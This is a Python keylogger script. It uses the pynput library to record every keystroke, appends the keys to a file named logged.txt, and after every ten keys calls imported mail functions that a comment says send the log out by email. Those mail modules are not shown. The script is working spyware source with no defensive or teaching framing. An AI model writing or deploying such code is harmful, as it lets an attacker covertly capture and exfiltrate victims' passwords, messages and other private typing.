import pynput
import datetime
from pynput import keyboard as kb
from pynput.keyboard import Key
from pynput.keyboard import Listener
from generator import mail_fun
from mailsender import mail_send



count=0
current_time=datetime.datetime.now()
# stop_time=current_time+datetime.timedelta(minutes=2)
keys=[]

# ON_PRESS function is used for capturing the key strokes from the system and it will the keystoke the text_file function

def on_press(key):
    global keys,count,current_time
    lst=["key.enter","key.down","key.backspace","key.up","key.right","key.left","key.tab","key.alt_l","key.alt_r","key.shift_r","key.cmd","key.shift","key.ctr1_l","key.ctrl_r"]
    keys.append(key)
    count+=1
    # print("{0} pressed".format(key))
    if(count>10):
        count=0
        text_file(keys,lst)
        keys=[]
        mail_fun()

# TEXT_FILE function is used for write the captured key stroke to the textfile named logged.txt and it calls the mail_send function to send that text file

def text_file(keys,lst):
    with open("logged.txt","a") as fp:
        for key in keys:
            if key not in lst:
                k=str(key).replace("'","")
                print(k)
                if k.find("space") > 0:
                    fp.write(" ")
                elif k.find("enter")>0:
                    fp.write("\n")
                elif k.find("kb.Key")==-1:
                    fp.write(k)
                else:
                    pass
    
  
#  ON_RELEASE function is used for break from the loop 

def on_release(key):
    if key==kb.Key.esc:
        return False

# It will start the listening process from the begining of the process

with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()
